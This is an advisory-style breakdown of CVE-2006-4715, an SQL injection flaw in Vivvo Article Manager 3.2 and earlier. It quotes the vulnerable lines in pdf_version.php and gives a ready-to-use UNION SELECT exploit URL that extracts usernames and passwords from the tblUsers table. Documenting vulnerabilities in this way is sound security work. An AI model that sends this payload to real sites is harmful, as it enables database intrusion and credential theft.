The provided content relates to CVE-2006-4715, describing an SQL Injection vulnerability in Vivvo Article Manager 3.2.

Here's a breakdown:

*   **Vulnerability:** SQL Injection
*   **Affected Software:** Vivvo Article Manager
*   **Affected Version:** <=3.2
*   **Vulnerable File:** pdf\_version.php
*   **Vulnerable Code:**
    *   `line 19: $aid=secure_sql($_GET['id']);`
    *   `line 20: $query="SELECT * from tblArticles where id=$aid";`
*   **Root Cause:** The `secure_sql` function does not adequately sanitize user input, allowing for SQL injection attacks. Specifically, it fails to block all SQL injection attempts.
*   **Attack Vector:** By manipulating the `id` parameter in the `pdf_version.php` file.
*   **Exploit:**
    *   `http://[target]/[path]/pdf_version.php?id=-1%20UNION%20SELECT%201,2,3,password,5,6,username,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24%20FROM%20tblUsers%20where%20userid=[target_user_id]`
*   **Impact:** An attacker can extract sensitive information from the database, such as usernames and passwords. In this specific exploit, the attacker can retrieve the `password` and `username` from the `tblUsers` table.
*   **Attacker Skill/Position:** The attacker needs to be able to send HTTP requests to the target server.
